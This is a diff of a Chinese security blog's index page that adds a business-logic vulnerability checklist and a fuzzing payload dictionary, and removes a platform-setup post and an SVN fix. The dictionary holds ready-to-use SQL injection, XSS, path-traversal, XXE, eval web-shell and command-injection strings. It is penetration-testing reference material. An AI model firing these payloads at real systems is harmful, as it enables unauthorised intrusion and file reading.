@@ -138,6 +138,266 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
+                <a class="clearlink" href="15596178265897.html">
+                
+                  <h1>业务逻辑漏洞安全检查checklist</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>未公开整理好的 checklist 全部内容，也不打算全部公开。</p>
+</blockquote>
+
+<h2 id="toc_0">认证</h2>
+
+<p>图形验证码问题（验证码缺失、验证码回显、验证码绕过、验证流程不正确、重放攻击）<br/>
+手机验证码（短信轰炸、验证码劫持）<br/>
+会话固定<br/>
+cookie 伪造/爆破<br/>
+使用默认凭证（管理后台、数据库密码）<br/>
+冻结账户策略不当<br/>
+弱用户名和密码<br/>
+“记住我”功能缺陷（前端记住/发送密码）<br/>
+自动登录<br/>
+单点登录劫持<br/>
+第三方登录劫持<br/>
+二维码登录劫持<br/>
+弱口令<br/>
+弱安全问题/答案<br/>
+弱的密码恢复机制<br/>
+Oauth2.0授权漏洞<br/>
+JWT安全<br/>
+注册覆盖<br/>
+未验证的重定向和转发<br/>
+双因素认证不当（双因素后获取的凭证，在无需双因素处可以获得）<br/>
+恶意注册</p>
+
+<h2 id="toc_1">授权</h2>
+
+<p>测试角色定义（授权不当）<br/>
+权限管理缺失（无权限设计）<br/>
+匿名访问（备用接口——常见于兼容老的不安全的接口时产生）<br/>
+水平越权<br/>
+垂直越权<br/>
+超级账户<br/>
+实名认证不严格</p>
+
+<h2 id="toc_2">会话管理</h2>
+
+<p>cookie安全属性<br/>
+cookie可猜解/伪造<br/>
+cookie溢出<br/>
+会话固定漏洞<br/>
+用户凭证不安全传输（弱加密或明文传输）<br/>
+用户凭证未一次失效<br/>
+用户凭证可猜解<br/>
+注销与会话超时<br/>
+敏感数据不安全传输（get 方法传输 session）</p>
+
+<h2 id="toc_3">内容安全</h2>
+
+<p>敏感信息过度显示<br/>
+违法违规信息</p>
+
+<h2 id="toc_4">设计缺陷</h2>
+
+<p>业务一致性（篡改类）漏洞（订单 id、邮箱或用户名、手机号、商品编号、用户 id、支付金额、优惠券金额、商品数量、最大数限制、前端限制绕过）<br/>
+刷赞、刷关注、刷票、刷奖品<br/>
+流程绕过（密码找回、支付、登录验证）</p>
+
+<h2 id="toc_5">典型场景</h2>
+
+<p>个人信息<br/>
+密码找回/修改<br/>
+支付流程<br/>
+注册流程<br/>
+需要手机/邮箱验证的业务</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/6/4 11:10 上午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15596171974228.html">
+                
+                  <h1>最近做了个 fuzzing 字典精简版</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>仅用于学习目的，请勿进行违法犯罪活动，也不要用来扫描别人系统，扫描未授权的计算机是犯法的。<br/>
+本字典可以用来检测（不保证效果、payload 自行琢磨修改）：sql 注入、xss、敏感目录泄露、敏感文件泄露、iis 短文件名、xml 注入、ssrf、远程命令执行、未验证的 url 跳转、任意文件读取等。</p>
+</blockquote>
+
+<pre class="line-numbers"><code class="language-text">&#39;
+&quot;
+[
+@
+#
+%
+&amp;
+*
+(
+)
+]
+/
+??
+//
+\\
+../
+&lt;!-- 
+%20select @@version
+)%20or%20(&#39;x&#39;=&#39;x
+%20or &#39;a&#39;=&#39;a
+%20or 2 &gt; 1
+%20or &#39;a&#39;=&#39;a
+%20or 1=1
+%20and%201=1
+%20and%201=2
+/**/or/**/1/**/=/**/1
+select &#39;10as&#39;=10;
+exec master..xp_cmdshell &#39;ipconfig+/all&#39;
+%20or &#39;7659&#39;=&#39;7659
+%20or &#39;text&#39; = n&#39;text&#39;
+) union select * from information_schema.tables;
+1+AND+USER_NAME()=’dbo’
+1;waitfor+delay+’0:0:10’
+1’;shutdown –
+as
+%20select 1/*!50000union/*!*//*!50000select/*!*/2;
+%20or 0=0 #&quot;
+&#39; union (select @@version) --
+&#39; union (select NULL, (select @@version)) --
+&#39; union (select NULL, NULL, (select @@version)) --
+&#39; union (select NULL, NULL, NULL,  (select @@version)) --
+&#39; union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+&#39; union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+--
+/*
+1’; insert into users values(‘lonelyor’,’lonelyor’)
+%28
+%29
+&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;
+&lt;script&gt;alert(8888)&lt;/script&gt;
+&lt;script&gt;confirm(8866)&lt;/script&gt;
+&lt;script&gt;prompt(8877)&lt;/script&gt;
+a&lt;img src=1 onerror=alert(1)&gt;a
+&lt;img src=x onerror=alert(11)&gt;29
+&lt;anytag onmouseover=alert(1)&gt;s
+&quot;&gt;&lt;img/onload=alert(1)&gt;&#39; -- 
+&lt;video onloadstart=alert(1)&gt;&lt;source&gt;
+&lt;a onclick=alert(2)&gt;h
+&lt;button/onclick=alert(6)&gt;h
+&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;
+&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;
+&lt;body/onload=alert(12)&gt;
+&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
+&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt;
+&lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+.git
+.gitignore
+.svn
+wp-admin
+wp-login.php
+.DS_store
+.ds_store
+index.php.bak
+.index.php~
+index.php.~
+robots.txt
+.git/config
+admin/
+/admin
+uploads/
+download/
+downloads/
+manager/
+/include
+1.jsp
+hack.jsp
+1.php
+1.asp
+/新建文本文档.txt
+/etc/passwd
+etc/passwd
+../../../../etc/passwd
+/../../../../etc/passwd
+..2f..2fetc2fpasswd
+&lt;!--?xml version=&quot;1.0&quot; ?--&gt;&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:///etc/
+&lt;%eval request(chr(35))%&gt;
+&lt;?=eval($_POST[&#39;cmd&#39;]);
+cmd
+system(&quot;ls -al /&quot;)
+%s%s%s%s%s%s%s%s%s%s
+NULL
+null
+zull
+/C:\Program Files\
+C:\Program Files\
+&lt;!--#exec cmd=&quot;ls&quot; --&gt;
+&lt;!--#exec cmd=&quot;dir&quot; --&gt;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;Hello World&lt;/text&gt;&lt;/change-log&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe7eb97 SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+| ping -i 30 127.0.0.1 |
+&amp; ping -i 30 127.0.0.1 &amp;
+?url=http://www.zhihu.com/
+?url=https://www.zhihu.com/
+http://www.lonelyor.org/
+https://www.lonelyor.org/
+$ENV{&#39;HOME&#39;}
+2.2250738585072011e-308
+01/01/1979
+*~1*/.aspx
+a*~1*/.aspx
+&lt;h1&gt;haha&lt;/h1&gt;
+</code></pre>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/6/4 10:59 上午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
                 <a class="clearlink" href="15595455557551.html">
                 
                   <h1>使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞</h1>
@@ -315,246 +575,6 @@
                 </div>
               </div><!-- article -->
         
-			<div class="article">
-                <a class="clearlink" href="15590262822391.html">
-                
-                  <h1>洞察-宜信集应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的平台的安装与使用</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p><a href="https://github.com/creditease-sec/insight">https://github.com/creditease-sec/insight</a> 感谢作者！</p>
-</blockquote>
-
-<h2 id="toc_0">部署和启动 mysql in docker</h2>
-
-<p>1、首先安装 docker，这里略过</p>
-
-<p>2、安装 mysql 的 docker 镜像<code>docker pull mysql:5.7.13</code></p>
-
-<p>3、启动 mysql，这里的 name 可以自行指定。</p>
-
-<pre class="line-numbers"><code class="language-text">docker run -d -p 127.0.0.1:6606:3306 \
---name open_source_mysqldb \
--e MYSQL_ROOT_PASSWORD=root \
-mysql:5.7.13
-</code></pre>
-
-<p>4、查看已经启动的 docker 镜像，这里注意 name 后面要用到。<code>docker ps -a</code><br/>
-<figure><img src="media/15590262822391/15590264712809.jpg" alt=""/></figure></p>
-
-<p>5、进入容器bash<code>docker exec -it open_source_mysqldb bash</code></p>
-
-<p>6、进入 mysql 并创建数据库和账号权限配置<br/>
-<code>mysql -h localhost -P 6606 -u root -p</code><br/>
-<figure><img src="media/15590262822391/15590267094981.jpg" alt=""/></figure></p>
-
-<pre class="line-numbers"><code class="language-text">mysql&gt; CREATE DATABASE IF NOT EXISTS vuldb DEFAULT CHARSET utf8 COLLATE utf8_general_ci;
-mysql&gt; grant all on vuldb.* to vuluser@&#39;%&#39; identified by &#39;vulpassword&#39;;
-mysql&gt; flush privileges;
-mysql&gt; quit
-</code></pre>
-
-<p><figure><img src="media/15590262822391/15590267827107.jpg" alt=""/></figure></p>
-
-<p>7、退出容器 bash<code>exit</code></p>
-
-<h2 id="toc_1">部署和启动 APP</h2>
-
-<p>1、下载源码<br/>
-<code>$ git clone https://github.com/creditease-sec/insight.git</code></p>
-
-<p>2、修改srcpm/config.py 配置文件</p>
-
-<ul>
-<li><p>修改公司邮箱后缀    </p>
-<pre class="line-numbers"><code class="language-text">#公司邮箱后缀限制，只能使用公司邮箱注册账号。
-CORP_MAIL = &#39;@qq.com&#39;
-</code></pre></li>
-<li><p>修改邮件CC抄送列表    </p>
-<pre class="line-numbers"><code class="language-text">#平台发送的每封邮件的邮件抄送列表，可以设置发送给安全部邮箱列表，可自行修改，也可以保持不变为空
-&#39;&#39;&#39;<br/>
-示例：<br/>
-CC_EMAIL = [&#39;xxx1@creditease.cn&#39;,<br/>
-            &#39;xxx2@creditease.cn&#39;,<br/>
-        ]<br/>
-&#39;&#39;&#39;<br/>
-CC_EMAIL = [<br/>
-        ]<br/>
-        ```
-</code></pre></li>
-</ul>
-
-<ul>
-<li><p>修改开发模式的邮箱服务器和发件邮箱配置    </p>
-<pre class="line-numbers"><code class="language-text"># 以开发模式的配置运行，使用测试邮件服务器，并开启debug模式
-# 平台发邮件账号设置<br/>
-SRCPM_MAIL_SENDER = &#39;安全部 &lt;sec_creditease@sina.com&gt;&#39;<br/>
-# 发送邮件的服务器设置，邮箱密码由系统变量中读取<br/>
-MAIL_SERVER = &#39;smtp.sina.com&#39;<br/>
-MAIL_PORT = 587<br/>
-MAIL_USE_TLS = True<br/>
-MAIL_USERNAME = os.environ.get(<br/>
-    &#39;MAIL_USERNAME&#39;) or &#39;sec_creditease@sina.com&#39;<br/>
-MAIL_PASSWORD = os.environ.get(&#39;MAIL_PASSWORD&#39;) or &#39;&#39;
-</code></pre></li>
-<li><p>修改生产模式的邮箱服务器和发件邮箱配置</p>
-<pre class="line-numbers"><code class="language-text"># 以生产模式的配置运行，使用生产邮件服务器，并关闭debug模式
-# 平台发邮件账号设置<br/>
-SRCPM_MAIL_SENDER = &#39;安全部 &lt;xxx@creditease.cn&gt;&#39;<br/>
-# 发送邮件的服务器设置，账号密码由系统变量中读取<br/>
-MAIL_SERVER = &#39;x.x.x.x&#39;<br/>
-MAIL_PORT = 25<br/>
-MAIL_USE_TLS = False<br/>
-MAIL_USERNAME = os.environ.get(<br/>
-    &#39;MAIL_USERNAME&#39;) or &#39;xxx@creditease.cn&#39;<br/>
-MAIL_PASSWORD = os.environ.get(&#39;MAIL_PASSWORD&#39;) or &#39;&#39;
-</code></pre></li>
-</ul>
-
-<p>3、修改定时周期邮件 mail_sender.py 的配置    </p>
-
-<pre class="line-numbers"><code class="language-text">    #平台发送的每封邮件的邮件抄送列表，可以设置发送给安全部邮箱列表，可自行修改，也可以保持不变为空
-    &#39;&#39;&#39;
-    示例：
-    CC_EMAIL = [&#39;xxx1@creditease.cn&#39;,
-                &#39;xxx2@creditease.cn&#39;,
-            ]
-    &#39;&#39;&#39;
-    CC_EMAIL = [
-            ]
-    #主机名设置
-    SERVER_NAME = &#39;xxx.creditease.corp&#39;
-    # 平台发邮件账号设置
-    SRCPM_MAIL_SENDER = &#39;安全部 &lt;xxx@creditease.cn&gt;&#39;
-    # 发送邮件的服务器设置，账号密码由系统变量中读取
-    MAIL_SERVER = &#39;x.x.x.x&#39;
-    MAIL_PORT = 25
-    MAIL_USE_TLS = False
-    MAIL_USERNAME = os.environ.get(
-        &#39;MAIL_USERNAME&#39;) or &#39;xxx@creditease.cn&#39;
-    MAIL_PASSWORD = os.environ.get(&#39;MAIL_PASSWORD&#39;) or &#39;&#39;
-</code></pre>
-
-<p>4、修改srcpm/app/src/forms.py 漏洞来源下拉列表    </p>
-
-<pre class="line-numbers"><code class="language-text">    &#39;&#39;&#39; 下拉选项 &#39;&#39;&#39;
-    source_choices = [(&#39;&#39;,&#39;&#39;), (u&#39;安全部&#39;, u&#39;安全部&#39;), (u&#39;YISRC&#39;, u&#39;YISRC&#39;), (u&#39;公众平台&#39;, u&#39;公众平台&#39;), (u&#39;合作伙伴&#39;, u&#39;合作伙伴&#39;)]
-</code></pre>
-
-<p>5、在项目根目录下部署和启动APP    </p>
-
-<pre class="line-numbers"><code class="language-text"># 拉取镜像
-docker pull daocloud.io/liusheng/vulpm_docker:latest
-或
-自己构建镜像
-docker build -t=&#39;vulpm_docker&#39; .
-# 在项目目录下启动容器，确保当前目录下存在srcpm文件夹，MAIL_PASSOWRD替换为自己邮箱服务器的密码。
-$ docker run -d -p 127.0.0.1:9000:5000 \
---link open_source_mysqldb:db \
---name open_source_srcpm \
--v $PWD/srcpm:/opt/webapp/srcpm \
--e DEV_DATABASE_URL=&#39;mysql://vuluser:vulpassword@db/vuldb&#39; \
--e SrcPM_CONFIG=development \
--e MAIL_PASSWORD=&#39;xxxxxx&#39; \
-daocloud.io/liusheng/vulpm_docker:latest \
-sh -c &#39;supervisord -c srcpm/supervisor.conf &amp;&amp; supervisorctl -c srcpm/supervisor.conf start all &amp;&amp; tail -f srcpm/log/gunicorn.err &amp;&amp; tail -f srcpm/log/mail_sender.err&#39;
-</code></pre>
-
-<h1 id="toc_2">初始化数据库</h1>
-
-<p>参考作者写的就可以了。</p>
-
-<p><a href="https://github.com/creditease-sec/insight/blob/open-source/docs/db_init.md">数据库初始化详细配置指南</a></p>
-
-<p>或者</p>
-
-<p>直接导入初始化的sql</p>
-
-<p>导入sql</p>
-
-<pre class="line-numbers"><code class="language-text">$ mysql -h127.0.0.1 -P6606 -uroot -p vuldb &lt; srcpm/vuldb_init.sql
-</code></pre>
-
-<p>Enter password:root</p>
-
-<h2 id="toc_3">搭建完成</h2>
-
-<p>访问域名：<a href="http://127.0.0.1:9000/srcpm/">http://127.0.0.1:9000/srcpm/</a> 即可<br/>
-账号：<a href="mailto:admin@admin.com">admin@admin.com</a><br/>
-密码：11</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/5/28 14:51 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E5%B7%A5%E5%85%B7.html'>工具</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15589173721679.html">
-                
-                  <h1>svn 报错：“svn: E155015: Commit failed (details follow):svn: E155015: Aborting commit: '/Users/lonelyor/xxx.xls' remains in conflict” 解决方法</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>解决方案来自：<a href="https://stackoverflow.com/questions/2406469/svn-remains-in-conflict">https://stackoverflow.com/questions/2406469/svn-remains-in-conflict</a></p>
-</blockquote>
-
-<p>1、执行 svn resolved /Users/lonelyor/xxx.xlsx<br/>
-2、svn update<br/>
-3、svn commit -m &quot;xxxxxx&quot;</p>
-
-<p>搞定，可以正常执行 commit 操作。</p>
-
-<pre class="line-numbers"><code class="language-text">Sending        xxx.xlsx
-Transmitting file data .done
-Committing transaction...
-Committed revision 1135.
-</code></pre>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/5/27 8:36 上午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E5%B7%A5%E5%85%B7.html'>工具</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
               
 
 
@@ -640,6 +660,18 @@ Committed revision 1135.
 	      
 		      
 			      <li class="post">
+			        <a href="15643953233297.html">oh-my-zsh配置</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15643901825363.html">arch 使用 nginx -t 时报错“could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size” 解决办法</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15643634653227.html">manjaro 安装 vmtools</a>
 			      </li>
 		     
@@ -653,18 +685,6 @@ Committed revision 1135.
 		      
 			      <li class="post">
 			        <a href="15641083818915.html">manjaro更改国内源操作</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15640473747565.html">kali 下更新软件时报错，说下列签名无效的解决办法</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15638711886127.html">Archiso</a>
 			      </li>
 		     
 		  
